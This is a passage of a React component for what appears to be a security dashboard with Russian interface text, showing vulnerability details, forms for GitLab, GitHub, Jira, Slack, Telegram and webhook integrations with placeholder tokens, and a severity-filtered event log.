                        {selectedVuln.article.references.map((ref, idx) => (
                          <li key={idx}>
                            <a href={ref} target="_blank" rel="noopener noreferrer" className="reference-link">
                              {ref}
                            </a>
                          </li>
                        ))}
                      </ul>
                    </section>
                  )}

                  <div className="details-meta">
                    <div className="meta-item">
                      <span className="meta-label">Статус:</span>
                      <span className="meta-value">{selectedVuln.status}</span>
                    </div>
                    <div className="meta-item">
                      <span className="meta-label">Затронуто:</span>
                      <span className="meta-value">{selectedVuln.affected}</span>
                    </div>
                  </div>
                </article>
              </section>
            )}
          </>
        )}

        {activeTab === 'integrations' && (
          <section className="integrations-page">
            <header className="hero glass">
              <div>
                <h1>Интеграции</h1>
                <p className="muted">Настройте автоматические уведомления и интеграции с внешними системами</p>
              </div>
            </header>

            <div className="integrations-grid">
              {/* GitLab CI/CD */}
              <article className="card glass integration-card">
                <div className="integration-header">
                  <div className="integration-icon">🔷</div>
                  <div>
                    <h3>GitLab CI/CD</h3>
                    <p className="muted">Автоматический запуск сканов по merge/push</p>
                  </div>
                  <label className="toggle-switch">
                    <input
                      type="checkbox"
                      checked={integrations.gitlab.enabled}
                      onChange={(e) =>
                        setIntegrations({
                          ...integrations,
                          gitlab: { ...integrations.gitlab, enabled: e.target.checked },
                        })
                      }
                    />
                    <span className="slider"></span>
                  </label>
                </div>
                {integrations.gitlab.enabled && (
                  <div className="integration-form">
                    <div className="form-group">
                      <label>GitLab URL</label>
                      <input
                        type="text"
                        placeholder="https://gitlab.com"
                        value={integrations.gitlab.url}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            gitlab: { ...integrations.gitlab, url: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>Access Token</label>
                      <input
                        type="password"
                        placeholder="glpat-xxxxxxxxxxxxx"
                        value={integrations.gitlab.token}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            gitlab: { ...integrations.gitlab, token: e.target.value },
                          })
                        }
                      />
                    </div>
                    <button className="cta-small">Сохранить</button>
                  </div>
                )}
              </article>

              {/* GitHub Actions */}
              <article className="card glass integration-card">
                <div className="integration-header">
                  <div className="integration-icon">🐙</div>
                  <div>
                    <h3>GitHub Actions</h3>
                    <p className="muted">Интеграция с GitHub для автоматических сканов</p>
                  </div>
                  <label className="toggle-switch">
                    <input
                      type="checkbox"
                      checked={integrations.github.enabled}
                      onChange={(e) =>
                        setIntegrations({
                          ...integrations,
                          github: { ...integrations.github, enabled: e.target.checked },
                        })
                      }
                    />
                    <span className="slider"></span>
                  </label>
                </div>
                {integrations.github.enabled && (
                  <div className="integration-form">
                    <div className="form-group">
                      <label>Repository</label>
                      <input
                        type="text"
                        placeholder="owner/repo"
                        value={integrations.github.repo}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            github: { ...integrations.github, repo: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>GitHub Token</label>
                      <input
                        type="password"
                        placeholder="ghp_xxxxxxxxxxxxx"
                        value={integrations.github.token}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            github: { ...integrations.github, token: e.target.value },
                          })
                        }
                      />
                    </div>
                    <button className="cta-small">Сохранить</button>
                  </div>
                )}
              </article>

              {/* Jira / YouTrack / Linear */}
              <article className="card glass integration-card">
                <div className="integration-header">
                  <div className="integration-icon">📋</div>
                  <div>
                    <h3>Jira / YouTrack / Linear</h3>
                    <p className="muted">Создание задач при обнаружении уязвимостей</p>
                  </div>
                  <label className="toggle-switch">
                    <input
                      type="checkbox"
                      checked={integrations.jira.enabled}
                      onChange={(e) =>
                        setIntegrations({
                          ...integrations,
                          jira: { ...integrations.jira, enabled: e.target.checked },
                        })
                      }
                    />
                    <span className="slider"></span>
                  </label>
                </div>
                {integrations.jira.enabled && (
                  <div className="integration-form">
                    <div className="form-group">
                      <label>Service URL</label>
                      <input
                        type="text"
                        placeholder="https://your-domain.atlassian.net"
                        value={integrations.jira.url}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            jira: { ...integrations.jira, url: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>Email</label>
                      <input
                        type="email"
                        placeholder="user@example.com"
                        value={integrations.jira.email}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            jira: { ...integrations.jira, email: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>API Token</label>
                      <input
                        type="password"
                        placeholder="Enter API token"
                        value={integrations.jira.token}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            jira: { ...integrations.jira, token: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>Project Key</label>
                      <input
                        type="text"
                        placeholder="PROJ"
                        value={integrations.jira.project}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            jira: { ...integrations.jira, project: e.target.value },
                          })
                        }
                      />
                    </div>
                    <button className="cta-small">Сохранить</button>
                  </div>
                )}
              </article>

              {/* Slack */}
              <article className="card glass integration-card">
                <div className="integration-header">
                  <div className="integration-icon">💬</div>
                  <div>
                    <h3>Slack</h3>
                    <p className="muted">Уведомления в Slack каналы</p>
                  </div>
                  <label className="toggle-switch">
                    <input
                      type="checkbox"
                      checked={integrations.slack.enabled}
                      onChange={(e) =>
                        setIntegrations({
                          ...integrations,
                          slack: { ...integrations.slack, enabled: e.target.checked },
                        })
                      }
                    />
                    <span className="slider"></span>
                  </label>
                </div>
                {integrations.slack.enabled && (
                  <div className="integration-form">
                    <div className="form-group">
                      <label>Webhook URL</label>
                      <input
                        type="text"
                        placeholder="https://hooks.slack.com/services/..."
                        value={integrations.slack.webhookUrl}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            slack: { ...integrations.slack, webhookUrl: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>Channel</label>
                      <input
                        type="text"
                        placeholder="#security-alerts"
                        value={integrations.slack.channel}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            slack: { ...integrations.slack, channel: e.target.value },
                          })
                        }
                      />
                    </div>
                    <button className="cta-small">Сохранить</button>
                  </div>
                )}
              </article>

              {/* Telegram */}
              <article className="card glass integration-card">
                <div className="integration-header">
                  <div className="integration-icon">📱</div>
                  <div>
                    <h3>Telegram</h3>
                    <p className="muted">Оповещения в Telegram</p>
                  </div>
                  <label className="toggle-switch">
                    <input
                      type="checkbox"
                      checked={integrations.telegram.enabled}
                      onChange={(e) =>
                        setIntegrations({
                          ...integrations,
                          telegram: { ...integrations.telegram, enabled: e.target.checked },
                        })
                      }
                    />
                    <span className="slider"></span>
                  </label>
                </div>
                {integrations.telegram.enabled && (
                  <div className="integration-form">
                    <div className="form-group">
                      <label>Bot Token</label>
                      <input
                        type="password"
                        placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
                        value={integrations.telegram.botToken}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            telegram: { ...integrations.telegram, botToken: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>Chat ID</label>
                      <input
                        type="text"
                        placeholder="123456789"
                        value={integrations.telegram.chatId}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            telegram: { ...integrations.telegram, chatId: e.target.value },
                          })
                        }
                      />
                    </div>
                    <button className="cta-small">Сохранить</button>
                  </div>
                )}
              </article>

              {/* Webhook */}
              <article className="card glass integration-card">
                <div className="integration-header">
                  <div className="integration-icon">🔗</div>
                  <div>
                    <h3>Custom Webhook</h3>
                    <p className="muted">Кастомная интеграция через webhook</p>
                  </div>
                  <label className="toggle-switch">
                    <input
                      type="checkbox"
                      checked={integrations.webhook.enabled}
                      onChange={(e) =>
                        setIntegrations({
                          ...integrations,
                          webhook: { ...integrations.webhook, enabled: e.target.checked },
                        })
                      }
                    />
                    <span className="slider"></span>
                  </label>
                </div>
                {integrations.webhook.enabled && (
                  <div className="integration-form">
                    <div className="form-group">
                      <label>Webhook URL</label>
                      <input
                        type="text"
                        placeholder="https://your-service.com/webhook"
                        value={integrations.webhook.url}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            webhook: { ...integrations.webhook, url: e.target.value },
                          })
                        }
                      />
                    </div>
                    <div className="form-group">
                      <label>Secret Key</label>
                      <input
                        type="password"
                        placeholder="Optional secret for signing"
                        value={integrations.webhook.secret}
                        onChange={(e) =>
                          setIntegrations({
                            ...integrations,
                            webhook: { ...integrations.webhook, secret: e.target.value },
                          })
                        }
                      />
                    </div>
                    <button className="cta-small">Сохранить</button>
                  </div>
                )}
              </article>
            </div>
          </section>
        )}

        {activeTab === 'logs' && (
          <section className="card glass logs">
            <header className="card-header">
              <div>
                <h2>Лента событий</h2>
                <p className="muted">Фильтр по уровню критичности</p>
              </div>
              <div className="filters">
                {['all', 'critical', 'high', 'medium'].map((level) => (
                  <button
                    key={level}
                    className={`filter ${selectedSeverity === level ? 'active' : ''} ${level !== 'all' ? level : ''}`}
                    onClick={() => setSelectedSeverity(level)}
                  >
                    {level === 'all' ? 'Все' : level}
                  </button>
                ))}
              </div>
            </header>

            <div className="log-list">
              {filteredLogs.map((log) => (
                <article key={log.id} className="log-item">
                  <div>
                    <p className="log-title">{log.title}</p>
                    <p className="muted">
                      {log.timestamp} · {log.source}
                    </p>
                  </div>
                  <div className={`severity ${log.severity}`}>{log.severity}</div>
                </article>
              ))}
            </div>
          </section>
        )}
      </main>
    </div>
  );
}

